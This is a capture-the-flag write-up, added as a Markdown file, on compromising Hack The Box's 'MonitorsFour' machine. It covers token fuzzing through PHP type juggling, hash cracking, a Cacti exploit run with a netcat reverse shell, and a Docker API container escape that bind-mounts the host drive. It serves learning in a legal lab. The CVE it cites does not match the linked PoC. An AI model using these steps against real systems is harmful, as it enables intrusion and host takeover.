@@ -1,0 +1,319 @@
+---
+title: "MonitorsFour"
+description: "A guide on ctf challenge monitorsfour by Hack The Box"
+pubDate: "Jan 25 2026"
+heroImage: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/c7878dd8dba2eb248a89584ec958a5b8.png?size=small&format=webp"
+author: "Koustubh Badshah"
+tags: ["htb", "ctf", "writeup", "hackthebox", "monitorsfour", "cacti", "docker"]
+---
+
+# MonitorsFour
+
+
+## ⚠️ Disclaimer
+
+<div style=" color: red;">
+The content published in this write-up is intended **strictly for educational and learning purposes**. 
+
+No sensitive information is disclosed that would compromise the integrity of active machines or violate Hack The Box’s rules. All analysis is based on publicly allowed practices and personal learning experiences.
+
+Readers are strongly encouraged to:
+- Follow **Hack The Box’s Code of Conduct**
+- Attempt the machines **independently**
+- Use this content only to **understand techniques**, not to shortcut challenges
+
+The author takes **no responsibility for misuse** of the information provided. Any testing or exploitation discussed should be performed **only in legal, authorized environments**.
+By engaging with this content, you agree to use it ethically and responsibly.
+
+</div>
+
+## Introduction
+
+Hack The Box's ("MonitorsFour")[https://app.hackthebox.com/machines/MonitorsFour?tab=play_machine] released on 6<sup>th</sup> December 2025, 
+is a Easy difficulty windows machine that focus on web application exploitation and docker misconfiguration for privilege escalation attacks, services are running on the WSL. 
+The machine involves exploiting a vulnerable Cacti installation to gain initial access, followed by leveraging Docker API access to escalate privileges to root on the host system. 
+It was an interesting challenge that required a combination of web application security knowledge and container security understanding.
+
+### Reconnaissance
+
+I started with an nmap scan to identify open ports and services running on the target machine.
+
+```bash
+nmap -A <target-ip>
+```
+
+The scan revealed the following open ports and services:
+
+```
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    nginx
+|_http-title: Did not follow redirect to http://monitorsfour.htb/
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022|2012 (87%)
+OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2
+Aggressive OS guesses: Microsoft Windows Server 2022 (87%), Microsoft Windows Server 2012 R2 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+This scan indicates a web server running on port 80 and a Microsoft HTTPAPI service on port 5985, and a redirect from HTTP to http://monitorsfour.htb/. 
+Also revealed that the target is likely running a version of Microsoft Windows Server.
+
+Now that I have the initial information about the target machine, I can proceed with further enumeration and exploitation steps. 
+But first we need to add the target domain to our /etc/hosts file.
+
+```bash
+echo "<target-ip> monitorsfour.htb" | sudo tee -a /etc/hosts
+```
+
+### Web Enumeration
+
+I started by visiting the web server at http://monitorsfour.htb/ in my browser, which redirected me to a login page with a form to enter credentials,
+ I tried sql injection, commonly used paraphrase but found nothing. I used **gobuster** to enumerate directories and files on the web server.
+
+```bash
+gobuster dir -u http://monitorsfour.htb/ -w <path-to-wordlist>
+```
+Revealed the following interesting directories:
+
+```
+/.env                 (Status: 200) [Size: 97]
+/.htaccess            (Status: 403) [Size: 146]
+/.hta                 (Status: 403) [Size: 146]
+/.htpasswd            (Status: 403) [Size: 146]
+/contact              (Status: 200) [Size: 367]
+/controllers          (Status: 301) [Size: 162] [--> http://monitorsfour.htb/controllers/]
+/forgot-password      (Status: 200) [Size: 3099]
+/login                (Status: 200) [Size: 4340]
+/static               (Status: 301) [Size: 162] [--> http://monitorsfour.htb/static/]
+/user                 (Status: 200) [Size: 35]
+/views                (Status: 301) [Size: 162] [--> http://monitorsfour.htb/views/]
+```
+
+I checked the __.env__ file, which contained sensitive information such as database credentials and secret keys.
+Next , I explored the contact page which was nothing but showing error message that paths are not configured properly in the backend.
+I also checked the forgot-password page, which allowed to reset the password for the user by providing the email address. 
+But I didn't have any valid email addresses to test with. I also checked for any sql injection vulnerabilities on the page but found none.
+Next, I deceided to check the user page which retured a json response:
+
+```json
+{"error":"Missing token parameter"}
+```
+
+This indicated that the page required a token parameter to access the user information. I tried to brute-force the token using **wfuzz**:
+```bash
+wfuzz -c -z file,<path-to-wordlist> --hc 404 "http://monitorsfour.htb/user?token=FUZZ"
+```
+
+This revealed a loose token validation vulnerability which allow to get me user information like email, username, password hash etc.
+
+```
+curl -s "http://monitorsfour.htb/user?token=<token-value>"
+```
+
+If you want to know more about the <a href="https://secops.group/php-type-juggling-simplified/" target="_blank" rel="noopener noreferrer">PHP type juggling</a>.
+
+Also I conducted a subdomain enumeration using **ffuf** to find any hidden subdomains:
+
+```bash
+ffuf -c -u http://monitorsfour.htb/ -H "Host: FUZZ.monitorsfour.htb" -w <path-to-wordlist> -fw 3
+```
+
+and found cacti.monitorsfour.htb as a subdomain. After adding it to /etc/hosts file, I visited the subdomain in my browser and found a Cacti installation version 1.2.28. 
+I tried to login using default credentials but was unsuccessful. 
+
+
+### Exploitation
+
+Now that I have user information, I can proceed with exploiting the machine. I used the password hash obtained from the user information to crack the password using **john**.
+
+```bash
+john --wordlist=<path-to-wordlist> <hash-file>
+```
+
+This revealed the password for the user.
+
+```
+password: w***********
+```
+
+With the credentials in hand, I attempted to log in to the web application at http://monitorsfour.htb/login using the username "admin" and the cracked password. 
+Upon successful login, I gained access to the admin dashboard of the web application where I found nothing interesting only that it allowed to create API keys which might be useful later.
+Next, I tried to access through **evil-winrm** using the cracked credentials to gain a shell on the target machine.
+
+```bash
+evil-winrm -i <target-ip> -u admin -p 'w***********'
+```
+
+This did not grant me access, I also tried to access with other credentials but was unsuccessful. Therefore, I decided to explore the Cacti installation on the subdomain cacti.monitorsfour.htb.
+Which showed a login page, now I have credentials which I didn't possessed previously. While the username was "admin", it resulted in an unsuccessful attempt, 
+then I used different combinations of usernames and passwords until I successfully logged in with the following credentials:
+
+```
+user: marcus (admin's real name)
+password: w***********
+```
+
+Now that I had access to the Cacti dashboard, I explored the application for potential vulnerabilities. I discovered that the Cacti version 1.2.28 was vulnerable to an unauthenticated Remote Code Execution (RCE) vulnerability [(CVE-2025-66399)](https://github.com/Cacti/cacti/security/advisories/GHSA-c7rr-2h93-7gjf). 
+I exploited this vulnerability to gain a [(reverse shell)](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC/blob/main/exploit.py) on the target machine.    
+
+```bash
+python3 exploit.py --url http://cacti.monitorsfour.htb/ -u marcus -p 'w***********' -i <your-ip> -l 4444 -url http://cacti.monitorsfour.htb/
+``` 
+
+on another terminal, I set up a netcat listener to catch the reverse shell:
+
+```bash
+nc -lvnp 4444
+```
+
+This granted me a shell on the target machine as the user "marcus".
+
+Then I checked the system information to confirm my access:
+
+```bash
+$ uname -a
+Linux 821fbd6a43fa 6.6.87.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun  5 18:30:46 UTC 2025 x86_64 GNU/Linux
+$ whoami
+www-data
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ ls /home/marcus
+user.txt
+```
+
+user.txt found in /home/marcus directory, I read the file to obtain the user flag.
+
+```bash
+$ cat /home/marcus/user.txt
+<user-flag>
+```
+
+### Privilage Escalation
+
+On the target machine, I explored the file system for privelage escalation vectors, but found nothing then I noticed that the hostname was a bit unusual "821fbd6a43fa",
+ which suggested that the machine is running inside a containerised enviornment.
+I checked for the network interfaces to confirm my suspicion:
+
+```bash
+$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host proto kernel_lo
+       valid_lft forever preferred_lft forever
+2: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
+    link/ether 06:b2:af:6b:74:48 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 172.18.0.3/16 brd 172.18.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+```
+
+The presence of eth0@if7 strongly indicates this is inside a Docker container with an IP address of 172.18.0.3.
+
+I then tried to access the Docker daemon from within the container to see if I could exploit it for privilege escalation. 
+I attempted to connect to the Docker socket using curl:
+
+```bash
+$ curl -v http://host.docker.internal:2375/version
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host host.docker.internal:2375 was resolved.
+* IPv6: fdc4:f303:9324::254
+* IPv4: 192.168.65.254
+*   Trying [fdc4:f303:9324::254]:2375...
+* Immediate connect fail for fdc4:f303:9324::254: Network is unreachable
+*   Trying 192.168.65.254:2375...
+* connect to 192.168.65.254 port 2375 from 172.18.0.3 port 49310 failed: Connection refused
+* Failed to connect to host.docker.internal port 2375 after 19 ms: Could not connect to server
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+* closing connection #0
+curl: (7) Failed to connect to host.docker.internal port 2375 after 19 ms: Could not connect to server
+```
+
+Hostname host.docker.internal is used to access the Docker daemon from within a container. However, the connection was refused, 
+indicating that the Docker daemon is not exposed on port 2375.
+Then I tried to access the Docker socket file directly from within the container:
+
+```bash    
+$ ls -la /var/run/docker.sock
+ls: cannot access '/var/run/docker.sock': No such file or directory
+```
+
+This indicated that the Docker socket file is not mounted inside the container, preventing direct access to the Docker daemon.
+ Since I couldn't access the Docker daemon locally I decide to scan the internal network for docker daemon.
+
+```bash
+for i in $(seq 1 254); do
+  curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null \
+  | grep -q "ApiVersion" \
+  && echo "192.168.65.$i:2375 OPEN"
+done
+```
+
+and found ```192.168.65.x:2375 OPEN```. Further, I verified that the Docker daemon is accessible on that IP address:
+
+```bash
+$ curl http://192.168.65.x:2375/version
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   852    0   852    0     0  24854      0 --:--:-- --:--:-- --:--:-- 25058
+{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"28.3.2","Details":{"ApiVersion":"1.51","Arch":"amd64","BuildTime":"2025-07-09T16:13:55.000000000+00:00","Experimental":"false","GitCommit":"e77ff99","GoVersion":"go1.24.5","KernelVersion":"6.6.87.2-microsoft-standard-WSL2","MinAPIVersion":"1.24","Os":"linux"}},{"Name":"containerd","Version":"1.7.27","Details":{"GitCommit":"05044ec0a9a75232cad458027ca83437aae3f4da"}},{"Name":"runc","Version":"1.2.5","Details":{"GitCommit":"v1.2.5-0-g59923ef"}},{"Name":"docker-init","Version":"0.19.0","Details":{"GitCommit":"de40ad0"}}],"Version":"28.3.2","ApiVersion":"1.51","MinAPIVersion":"1.24","GitCommit":"e77ff99","GoVersion":"go1.24.5","Os":"linux","Arch":"amd64","KernelVersion":"6.6.87.2-microsoft-standard-WSL2","BuildTime":"2025-07-09T16:13:55.000000000+00:00"}
+```
+
+Showed that the Docker daemon is running version 28.3.2. Now that I had access to the Docker daemon, I could proceed with exploiting it for privilege escalation:
+
+```bash
+$ curl -s http://192.168.65.x:2375/images/json
+[{"Containers":1,"Created":1762794130,"Id":"sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666","Labels":{"com.docker.compose.project":"docker_setup","com.docker.compose.service":"nginx-php","com.docker.compose.version":"2.39.1"},"ParentId":"","Descriptor":{"mediaType":"application/vnd.oci.image.index.v1+json","digest":"sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666","size":856},"RepoDigests":["docker_setup-nginx-php@sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666"],"RepoTags":["docker_setup-nginx-php:latest"],"SharedSize":-1,"Size":1277167255},{"Containers":1,"Created":1762791053,"Id":"sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40","Labels":{"com.docker.compose.project":"docker_setup","com.docker.compose.service":"mariadb","com.docker.compose.version":"2.39.1","org.opencontainers.image.authors":"MariaDB Community","org.opencontainers.image.base.name":"docker.io/library/ubuntu:noble","org.opencontainers.image.description":"MariaDB Database for relational SQL","org.opencontainers.image.documentation":"https://hub.docker.com/_/mariadb/","org.opencontainers.image.licenses":"GPL-2.0","org.opencontainers.image.ref.name":"ubuntu","org.opencontainers.image.source":"https://github.com/MariaDB/mariadb-docker","org.opencontainers.image.title":"MariaDB Database","org.opencontainers.image.url":"https://github.com/MariaDB/mariadb-docker","org.opencontainers.image.vendor":"MariaDB Community","org.opencontainers.image.version":"11.4.8"},"ParentId":"","Descriptor":{"mediaType":"application/vnd.oci.image.index.v1+json","digest":"sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40","size":856},"RepoDigests":["docker_setup-mariadb@sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40"],"RepoTags":["docker_setup-mariadb:latest"],"SharedSize":-1,"Size":454269972},{"Containers":0,"Created":1759921496,"Id":"sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412","Labels":null,"ParentId":"","Descriptor":{"mediaType":"application/vnd.oci.image.index.v1+json","digest":"sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412","size":9218},"RepoDigests":["alpine@sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412"],"RepoTags":["alpine:latest"],"SharedSize":-1,"Size":12794775}]
+```
+
+shows that there are three images available on the Docker daemon. I decided to create a new container with a bind mount to the host's root filesystem to gain access to the host system:
+
+```json
+{
+  "Image": "alpine:latest",
+  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
+  "HostConfig": {
+    "Binds": ["/mnt/host/c:/mnt/host_root"]
+  },
+  "Tty": true,
+  "OpenStdin": true
+}
+
+```
+then I created the container using the Docker API, started it and retrieved the root flag:
+
+```bash
+$ curl -s -X POST -H 'Content-Type: application/json' -d @/<path-to-json-file> http://192.168.65.x:2375/containers/create?name=hack
+{"Id":"<container-id>","Warnings":[]}
+
+$ curl -s -X POST http://192.168.65.x:2375/containers/<container-id>/start
+
+$ curl -s http://192.168.65.x:2375/containers/<container-id>/logs?stdout=1
+<root-flag>
+```
+
+With this, I successfully escalated my privileges to root on the host machine and obtained the root flag.
+
+
+## Conclusion
+
+In this write-up, I demonstrated how I exploited the monitorsfour machine on Hack The Box. Starting with reconnaissance using nmap and gobuster, I identified vulnerabilities in a Cacti installation that allowed me to gain a foothold on the machine. From there, I explored the Docker environment and leveraged access to the Docker daemon to escalate my privileges to root on the host system. This challenge highlighted the importance of thorough enumeration and understanding container security in modern environments.
+
+## References
+- [CVE-2025-66399](https://www.cve.org/CVERecord?id=CVE-2025-66399)
+- [Docker API Documentation](https://docs.docker.com/engine/api/v1.51/)
+- [Hack The Box](https://www.hackthebox.com/)
+- [Evil-WinRM](https://github.com/evil-winrm/evil-winrm)
+- [John](https://github.com/openwall/john)
+- [Nmap](https://nmap.org/)
+- [WFuzz](https://github.com/xmendez/wfuzz)
+- [FFUF](https://github.com/ffuf/ffuf)
+- [Gobuster](https://github.com/OJ/gobuster)
+- [PHP Type Juggling](https://secops.group/php-type-juggling-simplified/)
